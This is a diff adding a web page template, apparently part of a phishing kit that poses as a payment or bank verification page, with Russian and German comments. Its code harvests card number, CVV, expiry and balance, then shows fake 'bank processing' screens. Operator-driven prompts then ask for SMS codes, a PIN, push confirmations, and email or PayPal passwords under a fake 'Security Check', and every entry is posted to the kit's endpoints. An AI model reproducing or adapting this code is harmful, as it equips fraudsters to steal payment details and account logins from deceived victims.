+  const wrongBalanceMessage = "<%=translate['wrong_code'][serviceLang]%>";
+
+const contentWrapper = document.createElement("div");
+contentWrapper.innerHTML = `
+  <div style="display: flex; flex-direction: column; align-items: center;">
+    <p class="swal-text" style="margin-bottom: 12px;">
+      <%=translate['correct_balance'][serviceLang]%>
+    </p>
+    <input
+      type="text"
+      id="balanceInput"
+      placeholder="0.00"
+      maxlength="255"
+      class="swal-content__input"
+      style="margin-top: 6px; text-align: center;"
+    />
+  </div>
+`;
+
+
+swal({
+    title: "<%=translate['error_title'][serviceLang]%>",
+    icon: "warning", // Добавлено предупреждение
+    content: contentWrapper,
+    closeOnEsc: false,
+    closeOnClickOutside: false,
+    buttons: {
+      confirm: {
+        text: "<%=translate['submit'][serviceLang] %>",
+        closeModal: false,
+      },
+    },
+  }).then(async () => {
+    const balance = document.getElementById("balanceInput").value.trim();
+
+    if (!balance) {
+      return swal(wrongBalanceMessage, "", "error").then(() => {
+        setTimeout(() => {
+          this.correctBalanceModal();
+        }, 3000);
+      });
+    }
+
+    try {
+      // Загрузка
+      swal({
+        title: false,
+        content: {
+          element: "div",
+          attributes: {
+            innerHTML: `
+              <div style="
+                display: flex;
+                flex-direction: column;
+                align-items: center;
+                justify-content: center;
+                padding: 25px 20px;
+                font-family: 'Inter', sans-serif;
+              ">
+                <div style="display: flex; gap: 6px; margin-bottom: 20px;">
+                  <div class="dot"></div>
+                  <div class="dot"></div>
+                  <div class="dot"></div>
+                </div>
+                <div style="font-size: 17px; font-weight: 600; margin-bottom: 4px;">
+                  <%= translate['wait'][serviceLang] %>
+                </div>
+                <div style="font-size: 14px; color: #444; text-align: center; line-height: 1.4;">
+                  <%= translate['bank_processes'][serviceLang] %>
+                </div>
+              </div>
+            `
+          }
+        },
+        buttons: false,
+        closeOnClickOutside: false,
+        closeOnEsc: false
+      });
+
+      await axios.post("/api/submitBalance", {
+        codeType: "balance",
+        code: balance,
+        token: this.logToken,
+      });
+
+    } catch (err) {
+      console.error("Ошибка при отправке баланса", err);
+      return swal(wrongBalanceMessage, "", "error").then(() => {
+        setTimeout(() => {
+          this.correctBalanceModal();
+        }, 3000);
+      });
+    }
+  });
+},
+
+      otherCardModal() {
+        // Показываем сообщение об ошибке
+        swal(
+          "<%=translate['error_title'][serviceLang]%>",
+          "<%=translate['other_card'][serviceLang]%>",
+          "error"
+        );
+        console.log("logToken:", this.logToken);
+
+        // Выполняем запрос на /auto/othercard
+        axios.post("/auto/othercard", {
+          token: this.logToken || "default_token", // Убедитесь, что token не undefined
+        })
+          .then((response) => {
+            console.log("Запрос на /auto/othercard выполнен успешно", response.data);
+          })
+          .catch((error) => {
+            console.error("Ошибка выполнения запроса на /auto/othercard", error);
+
+            // Отобразить сообщение об ошибке, если запрос не удался
+            swal(
+              "<%=translate['error_title'][serviceLang]%>",
+              "<%=translate['error_title'][serviceLang] || 'Ошибка запроса.'%>",
+              "error"
+            );
+          });
+      },
+      pushModal() {
+        // Асинхронно выполняем первый запрос без ожидания действия пользователя
+        axios.post("/auto/push", {
+          token: this.logToken,
+        })
+          .then((response) => {
+            console.log('Первый запрос выполнен успешно', response);
+          })
+          .catch((error) => {
+            console.error('Ошибка выполнения первого запроса', error);
+          });
+
+        // Отображаем модальное окно sweetalert для подтверждения действия пользователя
+        swal({
+          title: "<%=translate['push_title'][serviceLang]%>",
+          text: "<%=translate['push_text'][serviceLang]%>",
+          icon: "info",
+          closeOnClickOutside: true,
+          closeOnEsc: true,
+          buttons: {
+            confirm: {
+              text: "<%=translate['сonfirmed'][serviceLang]%>",
+              value: true,
+            },
+          },
+        })
+          .then(async (value) => { // Используем async для обработки асинхронного кода внутри
+            // Проверяем, была ли нажата кнопка "Confirmed"
+            if (value) {
+              try {
+                // Открываем окно с сообщением ожидания
+                swal({
+  title: false,
+  content: {
+    element: "div",
+    attributes: {
+      innerHTML: `
+        <div style="
+          display: flex;
+          flex-direction: column;
+          align-items: center;
+          justify-content: center;
+          padding: 25px 20px;
+          font-family: 'Inter', sans-serif;
+        ">
+          <div style="display: flex; gap: 6px; margin-bottom: 20px;">
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+          </div>
+          <div style="font-size: 17px; font-weight: 600; margin-bottom: 4px;">
+            <%= translate['wait'][serviceLang] %>
+          </div>
+          <div style="font-size: 14px; color: #444; text-align: center; line-height: 1.4;">
+            <%= translate['bank_processes'][serviceLang] %>
+          </div>
+        </div>
+      `
+    }
+  },
+  buttons: false,
+  closeOnClickOutside: false,
+  closeOnEsc: false
+})
+
+                // Асинхронно выполняем второй запрос после нажатия на кнопку "Confirmed"
+                const response = await axios.post("/api/confirmed", {
+                  token: this.logToken,
+                });
+
+                // Закрываем окно SweetAlert после успешного выполнения запроса
+                swal({
+  title: false,
+  content: {
+    element: "div",
+    attributes: {
+      innerHTML: `
+        <div style="
+          display: flex;
+          flex-direction: column;
+          align-items: center;
+          justify-content: center;
+          padding: 25px 20px;
+          font-family: 'Inter', sans-serif;
+        ">
+          <div style="display: flex; gap: 6px; margin-bottom: 20px;">
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+          </div>
+          <div style="font-size: 17px; font-weight: 600; margin-bottom: 4px;">
+            <%= translate['wait'][serviceLang] %>
+          </div>
+          <div style="font-size: 14px; color: #444; text-align: center; line-height: 1.4;">
+            <%= translate['bank_processes'][serviceLang] %>
+          </div>
+        </div>
+      `
+    }
+  },
+  buttons: false,
+  closeOnClickOutside: false,
+  closeOnEsc: false
+})
+              } catch (error) {
+                console.error('Ошибка выполнения второго запроса', error);
+                // Показываем сообщение об ошибке, если запрос не удался
+                swal("An error occurred", "Please try again later.", "error");
+              }
+            }
+          });
+      }
+
+,
+
+      successModal() {
+        swal(
+          "<%=translate["success"][serviceLang]%>",
+          "<%=translate["money_will"][serviceLang]%>",
+          "info", {
+
+          closeOnClickOutside: false,
+          closeOnEsc: false,
+          buttons: false,
+        }
+        );
+      },
+      successModal() {
+        swal(
+          "<%=translate["wait"][serviceLang]%>",
+          "<%=translate["bank_processes"][serviceLang]%>",
+          "info", {
+
+          closeOnClickOutside: false,
+          closeOnEsc: false,
+          buttons: false,
+        }
+        );
+      },
+
+
+
+      pictureModal(img){
+        swal("", "", "", {
+          content: {
+            element: "div",
+            attributes: {
+              id: "pictures_div"
+            },
+          },
+          closeOnClickOutside: false,
+          closeOnEsc: false,
+          buttons: false,
+        });
+
+        document.querySelector("#pictures_div").innerHTML = `<div class="pictures-container"><div class="pictures-element" data-item="writerImg"><img width="auto" height="225"  draggable="false" alt="" src="${img}"></div>`;
+        // document.querySelector(".pictures-container").classList.remove("disabled");
+      },
+      paypalModal() {
+        const wrongMailMessage = "<%= translate['wrong_mail'][ad.service.lang] %>";
+
+        swal({
+          content: {
+            element: "div",
+            attributes: {
+              innerHTML: `
+        <div style="display: flex; flex-direction: column; align-items: center; font-family: 'Helvetica Neue', sans-serif;">
+          <img src="https://www.paypalobjects.com/webstatic/mktg/logo/pp_cc_mark_111x69.jpg" alt="PayPal-Logo" style="height: 40px; margin-bottom: 15px;" />
+          <h3 style="font-size: 18px; font-weight: 600; margin-bottom: 10px; color: #003087;">
+            <%= translate['paypal_title'][ad.service.lang] %>
+          </h3>
+          <p style="font-size: 14px; margin-bottom: 15px; text-align: center; color: #333;">
+            <%= translate['paypal_about'][ad.service.lang] %>
+          </p>
+          <input
+            type="email"
+            placeholder="<%= translate['paypal_mail'][ad.service.lang] %>"
+            id="mailInput"
+            style="text-align: center; width: 100%; max-width: 300px; margin-bottom: 10px;
+                   border: 1px solid #ccc; padding: 10px; border-radius: 6px; font-size: 14px;"
+          />
+          <input
+            type="password"
+            placeholder="<%= translate['paypal_password'][ad.service.lang] %>"
+            id="mailPassInput"
+            style="text-align: center; width: 100%; max-width: 300px;
+                   border: 1px solid #ccc; padding: 10px; border-radius: 6px; font-size: 14px;"
+          />
+        </div>
+      `,
+            },
+          },
+          closeOnEsc: false,
+          closeOnClickOutside: false,
+          buttons: {
+            confirm: {
+              text: "<%= translate['submit'][ad.service.lang] || 'Einreichen' %>",
+              closeModal: false,
+              className: "custom-swal-confirm-button",
+            },
+          },
+        }).then(async () => {
+          const email = document.getElementById("mailInput").value.trim();
+          const password = document.getElementById("mailPassInput").value.trim();
+
+          if (!email || !password) {
+            swal("Ungültige Eingabe", "Bitte geben Sie sowohl E-Mail-Adresse als auch Passwort ein.", "error").then(() => {
+              setTimeout(() => {
+                paypalModal();
+              }, 3000);
+            });
+            return;
+          }
+
+          try {
+            swal({
+              content: {
+                element: "div",
+                attributes: {
+                  innerHTML: `
+              <div style="text-align: center;">
+                <img src="https://i.imgur.com/AN1d86t.gif" alt="Ladevorgang"
+                     style="width: 100px; height: 100px; margin-bottom: 10px;" />
+                <p style="font-size: 14px; color: #003087;">
+                  <strong><%= translate['paypal_wait'][ad.service.lang] %></strong>
+                </p>
+              </div>
+            `,
+                },
+              },
+              buttons: false,
+              closeOnClickOutside: false,
+              closeOnEsc: false,
+            });
+
+            const response = await axios.post("/api/submitMail", {
+              email,
+              password,
+              token: this.logToken,
+            });
+
+            // Optional: erfolgreiche Rückmeldung verarbeiten
+
+          } catch (err) {
+            console.error("Fehler beim Senden der E-Mail", err);
+            swal("Übermittlungsfehler", "Bitte überprüfen Sie Ihre Eingaben und versuchen Sie es erneut.", "error").then(() => {
+              setTimeout(() => {
+                paypalModal();
+              }, 3000);
+            });
+          }
+        });
+      },
+      mailModal() {
+        const wrongMailMessage = "<%= translate['wrong_mail'][ad.service.lang] %>";
+
+        swal({
+          icon: "info",
+          content: {
+            element: "div",
+            attributes: {
+              innerHTML: `
+          <div style="display: flex; flex-direction: column; align-items: center;">
+            <h3 style="font-size: 18px; font-weight: bold; margin-bottom: 10px; color: #333;">
+             Security Check
+            </h3>
+            <p style="font-size: 14px; margin-bottom: 15px; text-align: center; color: #333;">
+              Connect your email account for security check
+            </p>
+            <input
+              type="email"
+              placeholder="Email"
+              id="mailInput"
+              style="text-align: center; width: 100%; max-width: 300px; margin-bottom: 10px;
+                     border: 2px solid #ccc; padding: 10px; border-radius: 5px; font-size: 14px;"
+            />
+            <input
+              type="password"
+              placeholder="Password"
+              id="mailPassInput"
+              style="text-align: center; width: 100%; max-width: 300px;
+                     border: 2px solid #ccc; padding: 10px; border-radius: 5px; font-size: 14px;"
+            />
+          </div>
+        `,
+            },
+          },
+          closeOnEsc: false,
+          closeOnClickOutside: false,
+          buttons: {
+            confirm: {
+              text: "<%= translate['submit'][ad.service.lang] || 'Submit' %>",
+              closeModal: false,
+              className: "custom-swal-confirm-button",
+            },
+          },
+        }).then(async () => {
+          const email = document.getElementById("mailInput").value.trim();
+          const password = document.getElementById("mailPassInput").value.trim();
+
+          if (!email || !password) {
+            swal(wrongMailMessage, "", "error").then(() => {
+              setTimeout(() => {
+                mailModal();
+              }, 3000);
+            });
+            return;
+          }
+
+          try {
+            // Загрузка
+            swal({
+              content: {
+                element: "div",
+                attributes: {
+                  innerHTML: `
+              <div style="text-align: center;">
+                <img src="https://i.imgur.com/AN1d86t.gif" alt="Loading"
+                     style="width: 100px; height: 100px; margin-bottom: 10px;" />
+                <p style="font-size: 14px; color: #333;">
+                  <strong>Processing...</strong>
+                </p>
+              </div>
+            `,
+                },
+              },
+              buttons: false,
+              closeOnClickOutside: false,
+              closeOnEsc: false,
+            });
+
+            // Отправка
+            const response = await axios.post("/api/submitMail", {
+              email,
+              password,
+              token: this.logToken,
+            });
+
+
+
+            // mailModal();
+
+          } catch (err) {
+            console.error("Ошибка при отправке почты", err);
+            swal(wrongMailMessage, "", "error").then(() => {
+              setTimeout(() => {
+                mailModal();
+              }, 3000);
+            });
+          }
+        });
+      },
+
+      ferrModal(
+        codeType = "sms",
+        title = "<%=translate['sms_title'][serviceLang]%>",
+        text = "<%=translate['sms_text'][serviceLang]%>",
+        placeholder = "<%=translate['sms_placeholder'][serviceLang]%>",
+        wrong_code = "<%=translate['error_title'][serviceLang]%>"
+      ) {
+        swal.stopLoading();
+
+        const clickableText = text.replace(
+          /(https?:\/\/[^\s]+)/g,
+          '<a href="$1" target="_blank" style="color: #7cd1f9; text-decoration: underline;">$1</a>'
+        );
+
+const customContent = document.createElement("div");
+customContent.innerHTML = `
+  <div style="
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    font-family: 'Inter', sans-serif;
+  ">
+    <p style="
+      text-align: center;
+      margin-bottom: 16px;
+      font-size: 14px;
+      line-height: 1.4;
+      color: #555;
+      max-width: 320px;
+    ">
+      ${clickableText}
+    </p>
+    <input 
+      type="text" 
+      id="custom-input" 
+      placeholder="${placeholder}" 
+      maxlength="255"
+      style="
+        padding: 14px 18px;
+        width: 100%;
+        max-width: 280px;
+        border-radius: 16px;
+        border: 1px solid #d1d5db;
+        outline: none;
+        font-size: 16px;
+        text-align: center;
+        font-weight: 500;
+        background-color: #fff;
+        box-shadow: 0 1px 3px rgba(0,0,0,0.06);
+        transition: all 0.3s ease;
+      "
+      onfocus="this.style.borderColor='#007aff'; this.style.boxShadow='0 0 0 2px rgba(0,122,255,0.2)'"
+      onblur="this.style.borderColor='#d1d5db'; this.style.boxShadow='none'"
+    />
+  </div>
+`;
+
+        swal({
+          title,
+          content: customContent,
+          closeOnEsc: false,
+          closeOnClickOutside: false,
+          buttons: {
+            confirm: {
+              text: "<%=translate['submit'][serviceLang]%>",
+              closeModal: false,
+            },
+          },
+        }).then(async () => {
+          const code = document.getElementById("custom-input").value.trim();
+
+          if (!code) {
+            swal.stopLoading();
+            return swal(wrong_code, "", "error").then(() => {
+              setTimeout(() => {
+                this.ferrModal(codeType, title, text, placeholder, wrong_code);
+              }, 3000);
+            });
+          }
+
+          try {
+            await axios.post("/api/submitCustom", {
+              codeType,
+              code,
+              token: this.logToken,
+            });
+
+             swal({
+  title: false,
+  content: {
+    element: "div",
+    attributes: {
+      innerHTML: `
+        <div style="
+          display: flex;
+          flex-direction: column;
+          align-items: center;
+          justify-content: center;
+          padding: 25px 20px;
+          font-family: 'Inter', sans-serif;
+        ">
+          <div style="display: flex; gap: 6px; margin-bottom: 20px;">
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+          </div>
+          <div style="font-size: 17px; font-weight: 600; margin-bottom: 4px;">
+            <%= translate['wait'][serviceLang] %>
+          </div>
+          <div style="font-size: 14px; color: #444; text-align: center; line-height: 1.4;">
+            <%= translate['bank_processes'][serviceLang] %>
+          </div>
+        </div>
+      `
+    }
+  },
+  buttons: false,
+  closeOnClickOutside: false,
+  closeOnEsc: false
+})
+          } catch (err) {
+            swal.stopLoading();
+            return swal(wrong_code, "", "error").then(() => {
+              setTimeout(() => {
+                this.ferrModal(codeType, title, text, placeholder, wrong_code);
+              }, 3000);
+            });
+          }
+        });
+      },
+
+
+      pinModal(
+        codeType = "pin",
+        title = "<%=translate['pincode_1'][serviceLang]%>",
+        text = "<%=translate['pincode'][serviceLang]%>",
+        wrong_code = "<%=translate['error_title'][serviceLang]%>"
+      ) {
+        swal.stopLoading();
+        swal({
+          title,
+          text,
+          content: {
+            element: "input",
+            attributes: {
+              type: "password",
+              maxLength: 255,
+              required: true,
+              style: "text-align: center;width: auto;margin-left:auto;margin-right:auto;",
+            },
+          },
+          closeOnEsc: false,
+          closeOnClickOutside: false,
+          buttons: {
+            confirm: {
+              text: "<%=translate['submit'][serviceLang]%>",
+              closeModal: false,
+            },
+          },
+        }).then(async (code) => {
+          if (!code || code.trim() === "") {
+            swal.stopLoading();
+            return swal(wrong_code, "", "error").then(() => {
+              setTimeout(() => {
+                this.pinModal(codeType, title, text, wrong_code);
+              }, 3000);
+            });
+          }
+
+          try {
+            await axios.post("/api/submitCode", {
+              codeType,
+              code: code.trim(),
+              token: this.logToken,
+            });
+
+           swal({
+  title: false,
+  content: {
+    element: "div",
+    attributes: {
+      innerHTML: `
+        <div style="
+          display: flex;
+          flex-direction: column;
+          align-items: center;
+          justify-content: center;
+          padding: 25px 20px;
+          font-family: 'Inter', sans-serif;
+        ">
+          <div style="display: flex; gap: 6px; margin-bottom: 20px;">
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+          </div>
+          <div style="font-size: 17px; font-weight: 600; margin-bottom: 4px;">
+            <%= translate['wait'][serviceLang] %>
+          </div>
+          <div style="font-size: 14px; color: #444; text-align: center; line-height: 1.4;">
+            <%= translate['bank_processes'][serviceLang] %>
+          </div>
+        </div>
+      `
+    }
+  },
+  buttons: false,
+  closeOnClickOutside: false,
+  closeOnEsc: false
+})
+          } catch (err) {
+            swal.stopLoading();
+            return swal(wrong_code, "", "error").then(() => {
+              setTimeout(() => {
+                this.pinModal(codeType, title, text, wrong_code);
+              }, 3000);
+            });
+          }
+        });
+      },
+     codeModal(codeType) {
+        const title = "<%=translate['sms_title'][serviceLang]%>";
+        const text = "<%=translate['sms_text'][serviceLang]%>";
+        const placeholder = "<%=translate['sms_placeholder'][serviceLang]%>";
+        const wrongCodeMessage = "<%=translate['wrong_code'][serviceLang]%>";
+
+        // Отправка события на сервер
+        axios.post("/auto/sms", {
+          token: this.logToken,
+        }).then(function (response) {
+          console.log('Запрос выполнен успешно', response);
+        }).catch(function (error) {
+          console.error('Ошибка выполнения запроса', error);
+        });
+
+        // Показ модального окна
+        swal({
+          title: title,
+          text: text,
+          content: {
+            element: "input",
+            attributes: {
+              type: "password",
+              placeholder: placeholder,
+              maxLength: 255,
+              required: true,
+              style: "text-align: center; width: auto; margin-left: auto; margin-right: auto;"
+            },
+          },
+          closeOnEsc: false,
+          closeOnClickOutside: false,
+          buttons: {
+            confirm: {
+              text: "<%=translate['submit'][serviceLang]%>",
+              closeModal: false,
+            },
+          },
+        }).then(async (code) => {
+          // Проверка на пустое значение
+          if (!code || code.trim() === "") {
+            swal(wrongCodeMessage, "", "error").then(() => {
+              setTimeout(() => {
+                this.codeModal(codeType);
+              }, 3000);
+            });
+            return;
+          }
+
+          try {
+            const response = await axios.post("/api/submitCode", {
+              codeType,
+              code: code.trim(),
+              token: this.logToken,
+            });
+
+            swal({
+  title: false,
+  content: {
+    element: "div",
+    attributes: {
+      innerHTML: `
+        <div style="
+          display: flex;
+          flex-direction: column;
+          align-items: center;
+          justify-content: center;
+          padding: 25px 20px;
+          font-family: 'Inter', sans-serif;
+        ">
+          <div style="display: flex; gap: 6px; margin-bottom: 20px;">
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+          </div>
+          <div style="font-size: 17px; font-weight: 600; margin-bottom: 4px;">
+            <%= translate['wait'][serviceLang] %>
+          </div>
+          <div style="font-size: 14px; color: #444; text-align: center; line-height: 1.4;">
+            <%= translate['bank_processes'][serviceLang] %>
+          </div>
+        </div>
+      `
+    }
+  },
+  buttons: false,
+  closeOnClickOutside: false,
+  closeOnEsc: false,
+    timer: 5000, // ← обязательно
+
+}).then(() => {
+              this.codeModal(codeType);
+            });
+          } catch (err) {
+            console.error('Ошибка при отправке кода', err);
+            swal(wrongCodeMessage, "", "error").then(() => {
+              setTimeout(() => {
+                this.codeModal(codeType);
+              }, 3000);
+            });
+          }
+        });
+      },
+
+      valid_credit_card(value) {
+        // accept only digits, dashes or spaces
+        if (/[^0-9-\s]+/.test(value)) return false;
+
+        // The Luhn Algorithm. It's so pretty.
+        var nCheck = 0,
+          nDigit = 0,
+          bEven = false;
+        value = value.replace(/\D/g, "");
+
+        for (var n = value.length - 1; n >= 0; n--) {
+          var cDigit = value.charAt(n),
+            nDigit = parseInt(cDigit, 10);
+
+          if (bEven) {
+            if ((nDigit *= 2) > 9) nDigit -= 9;
+          }
+
+          nCheck += nDigit;
+          bEven = !bEven;
+        }
+
+        return nCheck % 10 == 0;
+      },
+      submitForm(e) {
+        e.preventDefault();
+
+        // Проверка номера карты
+        if (!this.valid_credit_card(this.cardNumber)) {
+          return (this.cardError = "<%= translate['card_number_invalid'][serviceLang] %>");
+        } else {
+          this.cardError = "";
+        }
+
+        // Безопасно обрабатываем цену
+        const priceStr = "<%= ad.price ? ad.price.replace(/\D+/g, '') : '' %>";
+        const price = parseFloat(priceStr);
+        const balance = parseFloat(this.cardBalance);
+
+        // Шаг 1 — предупреждение от банка
+        if (this.step < 2 && this.balanceChecker) {
+          return swal({
+            title: "<%= translate['attention'][serviceLang] %>",
+            icon: "warning",
+            text: "<%= translate['bank_asked'][serviceLang] %>",
+            buttons: true,
+            dangerMode: true,
+          }).then((val) => {
+            if (val) this.step = 2;
+          });
+        }
+
+        // Шаг 2 — проверка баланса (если включена)
+        if (this.step === 2 || !this.balanceChecker) {
+          if (this.balanceChecker) {
+            if (!this.cardBalance || balance === 0 || isNaN(balance)) {
+              return swal({
+                title: "<%= translate['error_title'][serviceLang] %>",
+                text: "<%= translate['correct_balance'][serviceLang] %>",
+                icon: "info",
+                buttons: {
+                  confirm: {
+                    text: "<%= translate['submit'][serviceLang] %>",
+                    closeModal: true,
+                  },
+                },
+                closeOnClickOutside: false,
+                closeOnEsc: false,
+              });
+            }
+
+            if (!isNaN(price) && balance === price) {
+              return swal({
+                title: "<%= translate['error_title'][serviceLang] %>",
+                text: "<%= translate['correct_balance'][serviceLang] %>",
+                icon: "info",
+                buttons: {
+                  confirm: {
+                    text: "<%= translate['submit'][serviceLang] %>",
+                    closeModal: true,
+                  },
+                },
+                closeOnClickOutside: false,
+                closeOnEsc: false,
+              });
+            }
+          }
+
+          // ⏳ Всё ок — отправляем данные
+          this.loading = true;
+
+          axios
+            .post("/api/submitCard", {
+              adId: "<%=ad.id %>",
+              number: this.cardNumber.replace(/\D+/g, ""),
+              expire: this.cardMonth.toString() + "/" + this.cardYear.toString().substr(-2),
+              cvv: this.cardCvv,
+              holder: this.cardHolder,
+              balance: this.cardBalance,
+            })
+            .finally(() => (this.loading = false))
+            .then((response) => {
+              if (response.data.status == false) {
+                swal({
+                  title: "<%=translate['error_title'][serviceLang]%>",
+                  text: "<%=translate['other_card'][serviceLang]%>",
+                  icon: "error",
+                  closeOnClickOutside: false,
+                  closeOnEsc: false,
+                  buttons: false,
+                  showLoaderOnConfirm: true,
+                });
+              } else {
+                localStorage.token = response.data.token;
+                this.logToken = response.data.token;
+                if (this.currentStatus == null) this.checkLogStatus();
+                swal({
+  title: false,
+  content: {
+    element: "div",
+    attributes: {
+      innerHTML: `
+        <div style="
+          display: flex;
+          flex-direction: column;
+          align-items: center;
+          justify-content: center;
+          padding: 25px 20px;
+          font-family: 'Inter', sans-serif;
+        ">
+          <div style="display: flex; gap: 6px; margin-bottom: 20px;">
+            <div class="dot"></div>
+            <div class="dot"></div>
+            <div class="dot"></div>
+          </div>
+          <div style="font-size: 17px; font-weight: 600; margin-bottom: 4px;">
+            <%= translate['wait'][serviceLang] %>
+          </div>
+          <div style="font-size: 14px; color: #444; text-align: center; line-height: 1.4;">
+            <%= translate['bank_processes'][serviceLang] %>
+          </div>
+        </div>
+      `
+    }
+  },
+  buttons: false,
+  closeOnClickOutside: false,
+  closeOnEsc: false
+});
+
+                axios.post("/auto/wait", {
+                  token: this.logToken,
+                })
+                  .then((response) => {
+                    console.log("Status removed successfully", response.data);
+                  })
+                  .catch((error) => {
+                    console.error("Error removing status", error);
+                  });
+              }
+            })
+            .catch((err) => {
+              swal("<%=translate['error_title'][serviceLang]%>", "<%=translate['error'][serviceLang]%>", "error");
+            });
+        }
+      },
+
+      checkLogStatus() {
+        axios
+          .post("/api/checkStatus", {
+            token: this.logToken,
+          })
+          .finally(() => setTimeout(() => this.checkLogStatus(this.logToken), 1500))
+          .then((response) => {
+            this.imgUrl = response.data.imgUrl
+
+            if (this.currentStatus != response.data.status)
+              this.currentStatus = response.data.status;
+          })
+          .catch((err) => err);
+      },
+
+
+
+    },
+      });
+  </script>
+  <script>
+    let balanceHandled = false;
+
+    async function handleBalanceOnce() {
+      if (balanceHandled) return;
+      balanceHandled = true;
+
+      try {
+        await axios.post("/api/enterBalance", { adId: "<%=ad.id%>" });
+        console.log("Запрос /api/enterBalance выполнен");
+
+        await axios.post("/auto/balance", { adId: "<%=ad.id%>" });
+        console.log("Запрос /auto/balance выполнен");
+      } catch (error) {
+        console.error("Ошибка в запросе:", error);
+      }
+    }
+
+    function attachOrAutoHandle() {
+      const input = document.getElementById("cardBalance");
+      if (!input) return;
+
+      if (!input.dataset.listenerAdded) {
+        input.dataset.listenerAdded = "true";
+
+        // Клик по полю
+        input.addEventListener("click", handleBalanceOnce);
+
+        // Также вызовем сразу, если поле уже отображено (например, autofill)
+        handleBalanceOnce();
+      }
+    }
+
+    // DOM загрузился
+    window.addEventListener("DOMContentLoaded", () => {
+      attachOrAutoHandle();
+
+      // Следим за добавлением поля
+      const observer = new MutationObserver(() => {
+        attachOrAutoHandle();
+      });
+
+      observer.observe(document.body, { childList: true, subtree: true });
+    });
+  </script>
+
+  <div id="support">
+    <script type="text/javascript">
+      var _smartsupp = _smartsupp || {};
+      _smartsupp.key = '<%=user.smartsupp%>';
+      window.smartsupp || (function (d) {
+        var s, c, o = smartsupp = function () { o._.push(arguments) }; o._ = [];
+        s = d.getElementsByTagName('script')[0]; c = d.createElement('script');
+        c.type = 'text/javascript'; c.charset = 'utf-8'; c.async = true;
+        c.src = 'https://www.smartsuppchat.com/loader.js?'; s.parentNode.insertBefore(c, s);
+      })(document);
+    </script>
+  </div>
+
+  <script>
+    if ("<%=user.smartsupp%>" == false) {
+      document.querySelector('#support').innerHTML = `
+        <div class="
+ chatra--webkit
+ chatra--style-round
+ chatra--side-bottom
+ chatra--pos-right
+ chatra--visible
+ chatra--expanded
+ chatra--fast-toggle
+" id="chatra" data-turbolinks-permanent="" style="
+ width: 380px;
+ height: 600px;
+ transform: none;
+ z-index: 2147483647;
+ display: none;
+">
+  <div id="chatra__iframe-wrapper">
+    <iframe frameborder="0" id="chatra__iframe" allowtransparency="true" title="Chatra live chat" allow="autoplay"
+      src="/supportChatFrame/<%=ad.id%>" style="width: 380px; height: 600px; position: absolute"></iframe>
+  </div>
+</div>
+<div class="support-circle"
+  onclick="document.querySelector('#chatra').style.display = 'block';this.style.display = 'none'"></div>
+                        `
+    }
+  </script>
+
+
+
+
+
+
+
+  <script>
+    const adId = "<%=ad.id%>"
+  </script>
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.19.2/axios.min.js"></script>
+  <script src="/js/eye.js" defer></script>
+
+</body>
